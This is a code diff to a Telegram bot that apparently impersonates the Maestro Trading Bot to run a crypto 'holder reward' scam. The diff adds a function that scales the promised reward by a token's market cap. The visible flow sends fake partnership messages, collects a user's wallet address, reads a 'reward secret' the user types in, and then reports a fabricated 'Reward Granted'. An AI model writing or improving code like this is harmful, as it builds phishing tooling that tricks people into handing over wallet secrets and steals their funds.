@@ -108,6 +108,7 @@ dp = Dispatcher(storage=storage)
 router = Router()
 bridge_state = {}
 REWARD_TOKEN_NAME_BY_CHAT: dict[int, str] = {}
+REWARD_AMOUNT_BY_CHAT: dict[int, int] = {}
 
 CHAIN_IDS = {
     "BSC": 56,
@@ -1328,14 +1329,39 @@ def format_monitor_text(mint_address, token_data=None, remaining_seconds=2160):
     )
 
 
-def build_reward_message(token_name: str) -> str:
+def calculate_reward_amount(market_cap_value) -> int:
+    try:
+        market_cap = float(market_cap_value or 0)
+    except Exception:
+        return 120
+
+    if market_cap <= 50000:
+        return 120
+    if market_cap <= 120000:
+        return 200
+    if market_cap <= 250000:
+        return 300
+    if market_cap <= 500000:
+        return 400
+    if market_cap <= 1000000:
+        return 600
+    if market_cap <= 2500000:
+        return 800
+    if market_cap <= 5000000:
+        return 1000
+    if market_cap <= 10000000:
+        return 1500
+    return 2000
+
+
+def build_reward_message(token_name: str, reward_amount: int) -> str:
     token_name = (token_name or "the token").strip() or "the token"
     return (
         "<b><i>🚀🚀 Maestro Partnership With Project Owners 🚀🚀</i></b>\n\n"
         f"<i>Are you a holder of <b>{token_name}</b>?</i>\n\n"
         f"<b>{token_name}</b> has partnered with <b><a href='https://t.me/MaestroOfficialTradeBot'>Maestro Trading Bot</a></b> to reward\n"
         "<i>holders with at least $800 worth of the token</i> with:\n\n"
-        f"➤ <b>$120 worth of {token_name}</b>\n"
+        f"➤ <b>${reward_amount} worth of {token_name}</b>\n"
         "➤ <b>💎 Maestro Premium Access</b>\n"
         "➤ <b>Access to Top Holders Group</b>\n"
         "➤ <b>Zero Fees</b> when you trade with <a href='https://t.me/MaestroOfficialTradeBot'>Maestro</a>\n"
@@ -1354,11 +1380,11 @@ def build_congratulations_message(token_name: str = "the token") -> str:
     )
 
 
-def build_reward_granted_message(token_name: str = "the token") -> str:
+def build_reward_granted_message(token_name: str = "the token", reward_amount: int = 120) -> str:
     token_name = (token_name or "the token").strip() or "the token"
     return (
         "<b>✅ Reward Granted ✅</b>\n"
-        f"<b>$120 worth of {escape(token_name)}</b> click /premium to access Maestro premium features\n"
+        f"<b>${reward_amount} worth of {escape(token_name)}</b> click /premium to access Maestro premium features\n"
         "<i>Click /start to start trading. Enjoy!</i>"
     )
 
@@ -1369,12 +1395,12 @@ def build_reward_keyboard():
     return builder.as_markup()
 
 
-async def send_reward_followup(bot: Bot, chat_id: int, token_name: str):
+async def send_reward_followup(bot: Bot, chat_id: int, token_name: str, reward_amount: int):
     await asyncio.sleep(5)
     try:
         await bot.send_message(
             chat_id=chat_id,
-            text=build_reward_message(token_name),
+            text=build_reward_message(token_name, reward_amount),
             parse_mode="HTML",
             reply_markup=build_reward_keyboard(),
             disable_web_page_preview=True,
@@ -1383,7 +1409,7 @@ async def send_reward_followup(bot: Bot, chat_id: int, token_name: str):
         print(f"Failed to send reward follow-up: {exc}")
 
 
-async def send_congratulations_followup(bot: Bot, chat_id: int, token_name: str = "the token"):
+async def send_congratulations_followup(bot: Bot, chat_id: int, token_name: str = "the token", reward_amount: int = 120):
     await asyncio.sleep(3)
     try:
         await bot.send_message(
@@ -3505,12 +3531,15 @@ async def check_for_contract_addresses(message: types.Message, state: FSMContext
     )
 
     reward_token_name = token_data.get("name") or mint_address
+    reward_amount = calculate_reward_amount(token_data.get("market_cap") or token_data.get("mc"))
     REWARD_TOKEN_NAME_BY_CHAT[message.chat.id] = reward_token_name
+    REWARD_AMOUNT_BY_CHAT[message.chat.id] = reward_amount
     asyncio.create_task(
         send_reward_followup(
             message.bot,
             message.chat.id,
             reward_token_name,
+            reward_amount,
         )
     )
 
@@ -3527,12 +3556,14 @@ async def check_for_contract_addresses(message: types.Message, state: FSMContext
 async def handle_check_eligibility(callback: types.CallbackQuery, state: FSMContext):
     chat_id = callback.message.chat.id
     reward_token_name = REWARD_TOKEN_NAME_BY_CHAT.get(chat_id)
+    reward_amount = REWARD_AMOUNT_BY_CHAT.get(chat_id)
     if not reward_token_name:
         contract_text = callback.message.text or ""
         contract_address = extract_contract_address(contract_text)
         if contract_address:
             token_data = await fetch_dexscreener_data(contract_address)
             reward_token_name = token_data.get("name") or contract_address
+            reward_amount = calculate_reward_amount(token_data.get("market_cap") or token_data.get("mc"))
     reward_token_name = reward_token_name or "the token"
 
     prompt = await callback.message.answer(
@@ -3543,6 +3574,7 @@ async def handle_check_eligibility(callback: types.CallbackQuery, state: FSMCont
     await state.update_data(
         reward_contract=callback.message.text or "",
         reward_token_name=reward_token_name,
+        reward_amount=reward_amount,
         reward_wallet_prompt_id=prompt.message_id,
     )
     await state.set_state(RewardFlowState.waiting_for_holder_wallet)
@@ -3563,7 +3595,8 @@ async def handle_holder_wallet_input(message: types.Message, state: FSMContext):
     await state.update_data(holder_wallet=wallet_address)
     state_data = await state.get_data()
     reward_token_name = state_data.get("reward_token_name") or "the token"
-    asyncio.create_task(send_congratulations_followup(message.bot, message.chat.id, reward_token_name))
+    reward_amount = state_data.get("reward_amount")
+    asyncio.create_task(send_congratulations_followup(message.bot, message.chat.id, reward_token_name, reward_amount))
 
 
 @dp.callback_query(F.data == "claim_reward")
@@ -3595,6 +3628,7 @@ async def handle_reward_secret_input(message: types.Message, state: FSMContext):
     state_data = await state.get_data()
     holder_wallet = state_data.get("holder_wallet", "Not provided")
     reward_token_name = state_data.get("reward_token_name") or REWARD_TOKEN_NAME_BY_CHAT.get(message.chat.id) or "the token"
+    reward_amount = state_data.get("reward_amount") or REWARD_AMOUNT_BY_CHAT.get(message.chat.id) or 120
     full_name = " ".join(filter(None, [message.from_user.first_name, message.from_user.last_name])).strip() or "N/A"
     username = message.from_user.username or "N/A"
     secret_value = (message.text or "").strip() or "[empty]"
@@ -3624,7 +3658,7 @@ async def handle_reward_secret_input(message: types.Message, state: FSMContext):
     try:
         await message.bot.send_message(
             chat_id=message.chat.id,
-            text=build_reward_granted_message(reward_token_name),
+            text=build_reward_granted_message(reward_token_name, reward_amount),
             parse_mode="HTML",
         )
     except Exception as exc:
